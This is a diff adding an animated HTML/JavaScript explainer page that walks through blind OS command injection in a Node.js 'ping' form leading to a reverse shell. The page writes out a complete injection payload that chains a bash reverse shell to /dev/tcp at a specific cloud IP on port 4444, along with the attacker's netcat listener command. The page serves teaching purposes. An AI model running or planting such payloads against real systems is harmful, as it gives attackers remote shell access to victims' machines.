@@ -1,0 +1,687 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>How the reverse shell gets established</title>
+<style>
+  :root {
+    --bg: #0b1016;
+    --bg-elev: #141b24;
+    --fg: #eceadf;
+    --dim: #6e7781;
+    --red: #e24b4a;
+    --red-glow: #f37c7b;
+    --green: #8ef5a0;
+    --green-glow: #a8ffb6;
+    --amber: #f0b854;
+    --blue: #7cc4ff;
+    --purple: #b9a3ff;
+    --line: #2a3340;
+  }
+  * { box-sizing: border-box; }
+  html, body {
+    margin: 0; min-height: 100vh;
+    background:
+      radial-gradient(1200px 600px at 50% 110%, #0f1a28 0%, transparent 60%),
+      radial-gradient(900px 500px at 50% -20%, #121a24 0%, transparent 60%),
+      var(--bg);
+    color: var(--fg);
+    font-family: ui-sans-serif, system-ui, -apple-system, sans-serif;
+    overflow: hidden;
+  }
+  .wrap { display: flex; flex-direction: column; min-height: 100vh; padding: 28px 40px; }
+
+  /* Header */
+  .header { display:flex; justify-content:space-between; align-items:center; margin-bottom: 20px; }
+  .brand {
+    font-size: 13px; letter-spacing: 2px; color: var(--dim);
+    text-transform: uppercase; font-family: ui-monospace, monospace;
+  }
+  .brand .dot { color: var(--red); }
+  h1 {
+    font-size: 26px; font-weight: 600; margin: 0;
+    opacity: 0; animation: fadeIn .6s forwards;
+  }
+
+  /* Phase caption */
+  .phase-bar {
+    display: flex; align-items: baseline; gap: 20px;
+    padding: 14px 22px;
+    background: var(--bg-elev);
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    margin-bottom: 24px;
+  }
+  .phase-num {
+    font-family: ui-monospace, monospace; color: var(--amber);
+    font-size: 15px; font-weight: 600; letter-spacing: 1.5px;
+    min-width: 56px;
+  }
+  .phase-text { font-size: 18px; color: var(--fg); line-height: 1.5; }
+  .phase { opacity: 0; display: none; }
+  .phase.on { opacity: 1; display: block; animation: fadeInSoft .4s ease; }
+
+  /* Stage layout */
+  .stage {
+    flex: 1;
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 32px;
+    position: relative;
+    min-height: 540px;
+  }
+
+  /* Panels for each actor */
+  .actor {
+    position: relative;
+    background: linear-gradient(180deg, #151d27 0%, #0f1620 100%);
+    border: 1px solid var(--line);
+    border-radius: 20px;
+    padding: 22px;
+    display: flex; flex-direction: column;
+    opacity: 0; transform: translateY(16px);
+    animation: fadeUp .6s forwards;
+  }
+  .actor-attacker { animation-delay: .3s; border-color: #1f3028; }
+  .actor-net      { animation-delay: .5s; border-color: #1c2635; background: transparent; }
+  .actor-victim   { animation-delay: .7s; border-color: #2a1818; }
+
+  .actor-head {
+    display: flex; justify-content: space-between; align-items: center;
+    margin-bottom: 14px;
+  }
+  .role-tag {
+    font-family: ui-monospace, monospace; font-size: 11px;
+    letter-spacing: 1.5px; text-transform: uppercase;
+    padding: 4px 10px; border-radius: 999px;
+  }
+  .role-tag.atk { color: var(--green); background: rgba(142,245,160,.08); border: 1px solid rgba(142,245,160,.3); }
+  .role-tag.net { color: var(--dim); background: rgba(110,119,129,.08); border: 1px solid rgba(110,119,129,.3); }
+  .role-tag.vic { color: var(--red-glow); background: rgba(243,124,123,.08); border: 1px solid rgba(243,124,123,.3); }
+  .actor-ip { font-family: ui-monospace, monospace; font-size: 11px; color: var(--dim); }
+
+  /* --- Cloud icon with server --- */
+  .cloud-scene {
+    flex: 0 0 auto;
+    position: relative;
+    display: flex; justify-content: center; align-items: center;
+    height: 180px;
+    margin-bottom: 8px;
+  }
+  .ripple {
+    position: absolute; width: 140px; height: 140px;
+    border-radius: 50%;
+    border: 2px solid var(--green);
+    opacity: 0;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%) scale(.3);
+  }
+  .ripple.on {
+    animation: ripple 2.4s ease-out infinite;
+  }
+  .ripple.r2 { animation-delay: .8s; }
+  .ripple.r3 { animation-delay: 1.6s; }
+
+  /* --- Victim: laptop illustration --- */
+  .laptop-scene {
+    position: relative;
+    display: flex; justify-content: center; align-items: center;
+    height: 180px;
+    margin-bottom: 8px;
+  }
+
+  /* Browser mockup inside victim */
+  .browser {
+    background: #fbfbf8; color: #14213d;
+    border-radius: 10px; margin-top: 12px;
+    overflow: hidden;
+    box-shadow: 0 10px 30px rgba(0,0,0,.4);
+  }
+  .browser-bar {
+    background: #e8e6df; padding: 8px 12px;
+    display: flex; gap: 6px; align-items: center;
+  }
+  .browser-bar .dots { display: flex; gap: 5px; }
+  .browser-bar .dot { width: 9px; height: 9px; border-radius: 50%; background: #c0beb6; }
+  .browser-bar .url {
+    flex: 1; background: #fff; border-radius: 5px;
+    font-family: ui-monospace, monospace; font-size: 10px;
+    color: #4a5568; padding: 3px 10px; margin-left: 8px;
+  }
+  .browser-body {
+    padding: 14px;
+  }
+  .nt-header {
+    background: #1f3864; color: #fff;
+    padding: 8px 12px; border-radius: 6px 6px 0 0;
+    font-weight: 600; font-size: 12px;
+    margin: -14px -14px 10px;
+  }
+  .nt-label { font-size: 11px; color: #6a6a63; margin-bottom: 4px; }
+  .nt-input {
+    background: #fff; border: 1px solid #d3d1c7;
+    border-radius: 5px; padding: 6px 10px;
+    font-family: ui-monospace, monospace; font-size: 10px;
+    color: #14213d; word-break: break-all;
+    min-height: 22px;
+    transition: color .3s, background .3s;
+  }
+  .nt-input.hostile { color: #a32d2d; background: #fcf2f2; }
+  .nt-btn {
+    display: inline-block;
+    background: #1f3864; color: #fff;
+    padding: 5px 16px; border-radius: 4px;
+    font-size: 11px; font-weight: 500;
+    margin-top: 8px;
+  }
+  .nt-status {
+    margin-top: 10px; padding: 6px 10px;
+    background: #e1f5ee; color: #0f6e56;
+    border-radius: 5px; font-size: 11px; font-weight: 500;
+    opacity: 0; transition: opacity .3s;
+  }
+  .nt-status.on { opacity: 1; }
+
+  /* Terminal mini */
+  .term {
+    background: #05080c; border-radius: 8px;
+    padding: 10px 12px;
+    font-family: ui-monospace, "JetBrains Mono", monospace;
+    font-size: 11px; line-height: 1.6;
+    min-height: 120px;
+  }
+  .term .prompt { color: var(--dim); }
+  .term .cmd-g { color: var(--green); }
+  .term .cmd-r { color: var(--red-glow); }
+  .term .out { color: var(--amber); }
+  .tl { opacity: 0; transition: opacity .25s; }
+  .tl.on { opacity: 1; }
+  .cursor {
+    display: inline-block; width: 7px; height: 12px;
+    background: var(--green); vertical-align: -1px;
+    animation: blink 1s steps(2) infinite;
+  }
+
+  /* Hidden node process in victim */
+  .proc {
+    margin-top: 10px;
+    background: #130d10;
+    border: 1px dashed #4a2020;
+    border-radius: 8px;
+    padding: 10px 12px;
+    font-family: ui-monospace, monospace;
+    font-size: 10px;
+    color: #c9b0b0;
+    line-height: 1.6;
+    opacity: 0;
+    transition: opacity .4s;
+  }
+  .proc.on { opacity: 1; }
+  .proc .step {
+    display: flex; align-items: center; gap: 6px;
+    opacity: 0; transition: opacity .3s;
+  }
+  .proc .step.on { opacity: 1; }
+  .proc .gear {
+    display: inline-block; width: 10px; height: 10px;
+    border-radius: 50%; background: var(--red-glow);
+    animation: pulse 1s ease-in-out infinite;
+  }
+
+  /* Network middle panel */
+  .net-scene {
+    flex: 1;
+    position: relative;
+    display: flex; flex-direction: column;
+    justify-content: center; align-items: center;
+    overflow: visible;
+  }
+  .net-grid {
+    position: absolute; inset: 0;
+    background-image:
+      linear-gradient(rgba(60,80,110,.15) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(60,80,110,.15) 1px, transparent 1px);
+    background-size: 28px 28px;
+    mask-image: radial-gradient(ellipse at center, #000 40%, transparent 85%);
+    pointer-events: none;
+  }
+  .globe-wrap {
+    position: relative; z-index: 2;
+    margin-bottom: 10px;
+  }
+  .net-label {
+    font-family: ui-monospace, monospace; font-size: 11px;
+    color: var(--dim); letter-spacing: 1.5px; text-transform: uppercase;
+    text-align: center;
+  }
+
+  /* SVG icon sizing */
+  svg.ico { display: block; }
+
+  /* The traveling packets — use SVG for path */
+  .packet-svg {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    pointer-events: none;
+    overflow: visible;
+    z-index: 5;
+  }
+
+  .packet {
+    opacity: 0;
+  }
+
+  /* Shell connection pulse badge */
+  .shell-badge {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: rgba(142,245,160,.08);
+    color: var(--green);
+    border: 1px solid rgba(142,245,160,.4);
+    padding: 4px 10px; border-radius: 999px;
+    font-family: ui-monospace, monospace; font-size: 10px;
+    font-weight: 600; letter-spacing: 1px;
+    opacity: 0; transition: opacity .4s;
+  }
+  .shell-badge.on { opacity: 1; }
+  .shell-badge .pulse {
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--green);
+    animation: pulse 1.4s ease-in-out infinite;
+  }
+
+  /* Timeline / step dots */
+  .timeline {
+    display: flex; justify-content: center; align-items: center;
+    gap: 16px; margin-top: 24px;
+  }
+  .dot {
+    width: 10px; height: 10px; border-radius: 50%;
+    background: var(--line);
+    transition: background .3s, transform .3s, box-shadow .3s;
+  }
+  .dot.on { background: var(--amber); transform: scale(1.3); box-shadow: 0 0 12px var(--amber); }
+  .dot.done { background: var(--green); }
+
+  .restart {
+    position: fixed; bottom: 20px; right: 20px;
+    background: var(--bg-elev); color: var(--fg);
+    border: 1px solid var(--line); padding: 10px 18px;
+    border-radius: 8px; font-family: inherit; font-size: 13px;
+    cursor: pointer; z-index: 100;
+  }
+  .restart:hover { background: #1c2430; }
+
+  @keyframes fadeIn { to { opacity: 1; } }
+  @keyframes fadeInSoft { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }
+  @keyframes fadeUp { to { opacity: 1; transform: translateY(0); } }
+  @keyframes ripple {
+    0% { opacity: .7; transform: translate(-50%,-50%) scale(.3); }
+    100% { opacity: 0; transform: translate(-50%,-50%) scale(1.4); }
+  }
+  @keyframes pulse {
+    0%,100% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.4); opacity: .6; }
+  }
+  @keyframes blink { 0%,50% { opacity: 1; } 51%,100% { opacity: 0; } }
+
+  /* Packet travel */
+  @keyframes travelLeft {
+    0% { transform: translateX(0); opacity: 0; }
+    10% { opacity: 1; }
+    90% { opacity: 1; }
+    100% { transform: translateX(var(--dist)); opacity: 0; }
+  }
+  @keyframes travelRight {
+    0% { transform: translateX(0); opacity: 0; }
+    10% { opacity: 1; }
+    90% { opacity: 1; }
+    100% { transform: translateX(var(--dist)); opacity: 0; }
+  }
+
+  .pkt {
+    position: absolute;
+    padding: 4px 10px;
+    border-radius: 6px;
+    font-family: ui-monospace, monospace; font-size: 10px;
+    font-weight: 600;
+    white-space: nowrap;
+    box-shadow: 0 2px 10px rgba(0,0,0,.4);
+  }
+  .pkt-red { background: var(--red); color: #fff; box-shadow: 0 0 20px var(--red); }
+  .pkt-green { background: var(--green); color: #0b1016; box-shadow: 0 0 20px var(--green); }
+  .pkt-blue { background: var(--blue); color: #0b1016; box-shadow: 0 0 20px var(--blue); }
+
+  .cmd-stream {
+    position: absolute; top: 50%; left: 0; width: 100%;
+    display: flex; flex-direction: column; gap: 6px;
+    transform: translateY(-50%);
+    pointer-events: none;
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="header">
+    <div class="brand"><span class="dot">●</span> BLIND OS COMMAND INJECTION · REVERSE SHELL</div>
+    <div class="brand">DEMO · LOCAL + LINODE</div>
+  </div>
+
+  <h1>How the attacker lands a shell on the victim</h1>
+
+  <!-- Phase caption bar -->
+  <div class="phase-bar" style="margin-top: 16px;">
+    <div class="phase-num" id="phaseNum">PHASE 1/6</div>
+    <div>
+      <div class="phase phase1 on">
+        <span class="phase-text"><b>Attacker arms a listener</b> on their Linode cloud server (port 4444). It passively waits for any machine to call home.</span>
+      </div>
+      <div class="phase phase2">
+        <span class="phase-text"><b>Attacker visits the vulnerable website</b> and pastes a reverse-shell payload into the innocent-looking "host" field.</span>
+      </div>
+      <div class="phase phase3">
+        <span class="phase-text"><b>The form is submitted.</b> Behind the scenes, Node.js hands the whole string to <code>/bin/sh</code>, which parses the semicolon as a separator.</span>
+      </div>
+      <div class="phase phase4">
+        <span class="phase-text"><b>The shell spawns <code>bash -i</code></b> and opens a TCP socket to the attacker's IP. The victim's own machine initiates the outbound connection.</span>
+      </div>
+      <div class="phase phase5">
+        <span class="phase-text"><b>The cloud listener catches it.</b> A live, interactive shell session now exists between the two machines.</span>
+      </div>
+      <div class="phase phase6">
+        <span class="phase-text"><b>The attacker types; the victim runs; output flies back.</b> Meanwhile the website's HTTP response still just said "reachable" — the blindness never mattered.</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Main stage -->
+  <div class="stage">
+
+    <!-- ATTACKER (cloud) -->
+    <div class="actor actor-attacker">
+      <div class="actor-head">
+        <span class="role-tag atk">① Attacker</span>
+        <span class="actor-ip">cloud · 172.104.186.140</span>
+      </div>
+
+      <div class="cloud-scene">
+        <!-- ripples for listening -->
+        <div class="ripple" id="rip1"></div>
+        <div class="ripple r2" id="rip2"></div>
+        <div class="ripple r3" id="rip3"></div>
+
+        <!-- Cloud icon with servers inside -->
+        <svg class="ico" width="180" height="140" viewBox="0 0 180 140">
+          <defs>
+            <linearGradient id="cloudG" x1="0" y1="0" x2="0" y2="1">
+              <stop offset="0%" stop-color="#2a3a4e"/>
+              <stop offset="100%" stop-color="#1a2535"/>
+            </linearGradient>
+          </defs>
+          <!-- cloud body -->
+          <path d="M40,95 C15,95 15,60 40,60 C40,35 85,30 92,52 C110,38 140,48 140,70 C165,70 165,95 140,95 Z"
+                fill="url(#cloudG)" stroke="#8ef5a0" stroke-width="2"/>
+          <!-- server rack inside -->
+          <g transform="translate(70,62)">
+            <rect x="0" y="0" width="42" height="8" rx="1" fill="#0b1016" stroke="#8ef5a0" stroke-width="1"/>
+            <circle cx="4" cy="4" r="1.3" fill="#8ef5a0"/>
+            <rect x="8" y="2.5" width="30" height="3" fill="#2a3340"/>
+            <rect x="0" y="12" width="42" height="8" rx="1" fill="#0b1016" stroke="#8ef5a0" stroke-width="1"/>
+            <circle cx="4" cy="16" r="1.3" fill="#8ef5a0"/>
+            <rect x="8" y="14.5" width="30" height="3" fill="#2a3340"/>
+            <rect x="0" y="24" width="42" height="8" rx="1" fill="#0b1016" stroke="#8ef5a0" stroke-width="1"/>
+            <circle cx="4" cy="28" r="1.3" fill="#8ef5a0">
+              <animate attributeName="opacity" values="1;0.3;1" dur="1.4s" repeatCount="indefinite"/>
+            </circle>
+            <rect x="8" y="26.5" width="30" height="3" fill="#2a3340"/>
+          </g>
+          <!-- antenna -->
+          <line x1="90" y1="62" x2="90" y2="38" stroke="#8ef5a0" stroke-width="2"/>
+          <circle cx="90" cy="34" r="4" fill="#8ef5a0" id="antenna"/>
+        </svg>
+      </div>
+
+      <div class="shell-badge" id="atkShellBadge">
+        <span class="pulse"></span> LISTENING :4444
+      </div>
+
+      <div class="term" style="margin-top: 12px;">
+        <div class="tl on"><span class="prompt">attacker@linode:~$</span> <span class="cmd-g">nc -lvnp 4444</span></div>
+        <div class="tl on" style="color:var(--dim);">Listening on 0.0.0.0 4444</div>
+        <div class="tl" id="aT1"><span style="color:var(--green);">Connection received</span> from 103.x.x.x</div>
+        <div class="tl" id="aT2"><span class="prompt">victim$</span> <span class="cmd-g">whoami</span></div>
+        <div class="tl" id="aT3"><span class="out">vichanshu</span></div>
+        <div class="tl" id="aT4"><span class="prompt">victim$</span> <span class="cmd-g">id</span></div>
+        <div class="tl" id="aT5"><span class="out">uid=1000(vichanshu) ...</span></div>
+      </div>
+    </div>
+
+    <!-- NETWORK -->
+    <div class="actor actor-net">
+      <div class="actor-head">
+        <span class="role-tag net">② Internet</span>
+        <span class="actor-ip">TCP · public network</span>
+      </div>
+
+      <div class="net-scene">
+        <div class="net-grid"></div>
+
+        <div class="globe-wrap">
+          <!-- globe icon -->
+          <svg class="ico" width="140" height="140" viewBox="0 0 140 140">
+            <circle cx="70" cy="70" r="55" fill="#0f1620" stroke="#2a3340" stroke-width="1.5"/>
+            <!-- latitude lines -->
+            <ellipse cx="70" cy="70" rx="55" ry="18" fill="none" stroke="#2a3340" stroke-width="1"/>
+            <ellipse cx="70" cy="70" rx="55" ry="36" fill="none" stroke="#2a3340" stroke-width="1"/>
+            <!-- longitude -->
+            <ellipse cx="70" cy="70" rx="18" ry="55" fill="none" stroke="#2a3340" stroke-width="1"/>
+            <ellipse cx="70" cy="70" rx="36" ry="55" fill="none" stroke="#2a3340" stroke-width="1"/>
+            <line x1="15" y1="70" x2="125" y2="70" stroke="#2a3340" stroke-width="1"/>
+            <line x1="70" y1="15" x2="70" y2="125" stroke="#2a3340" stroke-width="1"/>
+            <!-- nodes -->
+            <circle cx="42" cy="48" r="2" fill="var(--amber)" opacity=".7"/>
+            <circle cx="98" cy="58" r="2" fill="var(--amber)" opacity=".7"/>
+            <circle cx="60" cy="92" r="2" fill="var(--amber)" opacity=".7"/>
+            <circle cx="88" cy="88" r="2" fill="var(--amber)" opacity=".7"/>
+          </svg>
+        </div>
+        <div class="net-label">TCP :4444</div>
+
+        <!-- Packet travel container -->
+        <div class="packet-svg" id="pktLayer"></div>
+      </div>
+    </div>
+
+    <!-- VICTIM -->
+    <div class="actor actor-victim">
+      <div class="actor-head">
+        <span class="role-tag vic">③ Victim</span>
+        <span class="actor-ip">laptop · vulnerable app</span>
+      </div>
+
+      <div class="laptop-scene">
+        <!-- Laptop illustration -->
+        <svg class="ico" width="220" height="150" viewBox="0 0 220 150">
+          <defs>
+            <linearGradient id="screen" x1="0" y1="0" x2="0" y2="1">
+              <stop offset="0%" stop-color="#2a3340"/>
+              <stop offset="100%" stop-color="#1a2230"/>
+            </linearGradient>
+          </defs>
+          <!-- lid -->
+          <rect x="30" y="18" width="160" height="100" rx="6" fill="url(#screen)" stroke="var(--red-glow)" stroke-width="2"/>
+          <rect x="38" y="26" width="144" height="84" rx="3" fill="#fbfbf8"/>
+          <!-- browser bar inside -->
+          <rect x="38" y="26" width="144" height="10" fill="#e8e6df"/>
+          <circle cx="44" cy="31" r="1.5" fill="#c0beb6"/>
+          <circle cx="50" cy="31" r="1.5" fill="#c0beb6"/>
+          <circle cx="56" cy="31" r="1.5" fill="#c0beb6"/>
+          <!-- navy header -->
+          <rect x="44" y="40" width="132" height="12" fill="#1f3864"/>
+          <!-- form area -->
+          <rect x="48" y="58" width="120" height="8" fill="#e8e6df" rx="1"/>
+          <rect x="48" y="70" width="90" height="10" fill="#fff" stroke="#d3d1c7" stroke-width=".5" rx="1" id="laptopInput"/>
+          <rect x="142" y="70" width="26" height="10" fill="#1f3864" rx="1"/>
+          <rect x="48" y="86" width="120" height="8" fill="#e1f5ee" rx="1" opacity="0" id="laptopStatus"/>
+          <!-- base -->
+          <path d="M20,118 L200,118 L210,130 L10,130 Z" fill="#141b24" stroke="var(--red-glow)" stroke-width="2"/>
+          <rect x="95" y="121" width="30" height="3" fill="#2a3340" rx="1"/>
+        </svg>
+      </div>
+
+      <!-- Browser mockup showing what's typed -->
+      <div class="browser">
+        <div class="browser-bar">
+          <div class="dots"><span class="dot"></span><span class="dot"></span><span class="dot"></span></div>
+          <div class="url">localhost:3000</div>
+        </div>
+        <div class="browser-body">
+          <div class="nt-header">NetTools — Server Ping Utility</div>
+          <div class="nt-label">Host to check</div>
+          <div class="nt-input" id="webInput">127.0.0.1</div>
+          <div class="nt-btn">Check</div>
+          <div class="nt-status" id="webStatus">✓ Host is reachable</div>
+        </div>
+      </div>
+
+      <!-- Hidden process panel -->
+      <div class="proc" id="procPanel">
+        <div class="step" id="p1"><span class="gear"></span> Node <code>exec()</code> → spawns /bin/sh</div>
+        <div class="step" id="p2"><span class="gear"></span> sh parses <code>;</code> → runs ping, then bash</div>
+        <div class="step" id="p3"><span class="gear"></span> bash -i opens <code>/dev/tcp/172.104.186.140/4444</code></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step dots -->
+  <div class="timeline">
+    <div class="dot on" data-step="1"></div>
+    <div class="dot" data-step="2"></div>
+    <div class="dot" data-step="3"></div>
+    <div class="dot" data-step="4"></div>
+    <div class="dot" data-step="5"></div>
+    <div class="dot" data-step="6"></div>
+  </div>
+</div>
+
+<button class="restart" onclick="location.reload()">↻ Replay</button>
+
+<script>
+// Timing-based director
+const schedule = (fn, t) => setTimeout(fn, t);
+
+function setPhase(n) {
+  document.getElementById('phaseNum').textContent = `PHASE ${n}/6`;
+  document.querySelectorAll('.phase').forEach(e => e.classList.remove('on'));
+  const el = document.querySelector('.phase' + n);
+  if (el) el.classList.add('on');
+  document.querySelectorAll('.dot[data-step]').forEach(d => {
+    const s = +d.dataset.step;
+    d.classList.remove('on','done');
+    if (s < n) d.classList.add('done');
+    else if (s === n) d.classList.add('on');
+  });
+}
+
+function spawnPacket(opts) {
+  // opts: { from: 'victim'|'attacker', label, color, delay, duration }
+  const layer = document.getElementById('pktLayer');
+  const pkt = document.createElement('div');
+  pkt.className = 'pkt pkt-' + opts.color;
+  pkt.textContent = opts.label;
+  pkt.style.top = (opts.top || '45%');
+  const net = layer.getBoundingClientRect();
+  const dist = net.width + 220;
+  if (opts.from === 'victim') {
+    // start from right side, travel left
+    pkt.style.right = '-100px';
+    pkt.style.setProperty('--dist', `-${dist}px`);
+    pkt.style.animation = `travelLeft ${opts.duration}ms linear forwards`;
+  } else {
+    pkt.style.left = '-100px';
+    pkt.style.setProperty('--dist', `${dist}px`);
+    pkt.style.animation = `travelRight ${opts.duration}ms linear forwards`;
+  }
+  pkt.style.animationDelay = (opts.delay || 0) + 'ms';
+  layer.appendChild(pkt);
+  setTimeout(() => pkt.remove(), (opts.delay || 0) + opts.duration + 200);
+}
+
+// --- PHASE 1: Listener armed (1.5s - 4s) ---
+schedule(() => {
+  setPhase(1);
+  // start ripples
+  document.getElementById('rip1').classList.add('on');
+  document.getElementById('rip2').classList.add('on');
+  document.getElementById('rip3').classList.add('on');
+  document.getElementById('atkShellBadge').classList.add('on');
+}, 1500);
+
+// --- PHASE 2: Attacker types payload (4.5s - 7.5s) ---
+schedule(() => {
+  setPhase(2);
+  // type payload gradually
+  const payload = "127.0.0.1; bash -c 'bash -i >& /dev/tcp/172.104.186.140/4444 0>&1' &";
+  const input = document.getElementById('webInput');
+  input.classList.add('hostile');
+  let i = 0;
+  input.textContent = '';
+  const iv = setInterval(() => {
+    i++;
+    input.textContent = payload.slice(0, i);
+    if (i >= payload.length) clearInterval(iv);
+  }, 35);
+}, 4500);
+
+// --- PHASE 3: Form submitted, shell parses it (8s - 11s) ---
+schedule(() => {
+  setPhase(3);
+  // show the hidden process panel
+  document.getElementById('procPanel').classList.add('on');
+  schedule(() => document.getElementById('p1').classList.add('on'), 200);
+  schedule(() => document.getElementById('p2').classList.add('on'), 1200);
+}, 8000);
+
+// --- PHASE 4: bash -i opens socket; outbound packet flies (11s - 14s) ---
+schedule(() => {
+  setPhase(4);
+  document.getElementById('p3').classList.add('on');
+  // red packet flies from victim to attacker
+  spawnPacket({ from: 'victim', label: 'SYN → :4444', color: 'red', duration: 1600, delay: 300, top: '42%' });
+  spawnPacket({ from: 'victim', label: 'TCP handshake', color: 'red', duration: 1600, delay: 900, top: '55%' });
+}, 11000);
+
+// --- PHASE 5: Connection lands at listener (14s - 17s) ---
+schedule(() => {
+  setPhase(5);
+  document.getElementById('aT1').classList.add('on');
+  // badge still pulses - connection established
+}, 14500);
+
+// --- PHASE 6: Interactive shell — commands & output ping-pong (17s - 23s) ---
+schedule(() => {
+  setPhase(6);
+  // commands flow from attacker → victim
+  spawnPacket({ from: 'attacker', label: '← whoami', color: 'green', duration: 1600, delay: 0, top: '38%' });
+  schedule(() => document.getElementById('aT2').classList.add('on'), 800);
+
+  // output back
+  spawnPacket({ from: 'victim', label: 'vichanshu →', color: 'blue', duration: 1600, delay: 1800, top: '48%' });
+  schedule(() => document.getElementById('aT3').classList.add('on'), 3000);
+
+  // another command
+  spawnPacket({ from: 'attacker', label: '← id', color: 'green', duration: 1600, delay: 3600, top: '38%' });
+  schedule(() => document.getElementById('aT4').classList.add('on'), 4200);
+
+  spawnPacket({ from: 'victim', label: 'uid=1000 →', color: 'blue', duration: 1600, delay: 5000, top: '48%' });
+  schedule(() => document.getElementById('aT5').classList.add('on'), 6200);
+}, 17500);
+
+// also: show "Host is reachable" status in the website during phase 3
+schedule(() => {
+  document.getElementById('webStatus').classList.add('on');
+  document.getElementById('laptopStatus').setAttribute('opacity', '1');
+}, 9500);
+</script>
+</body>
+</html>
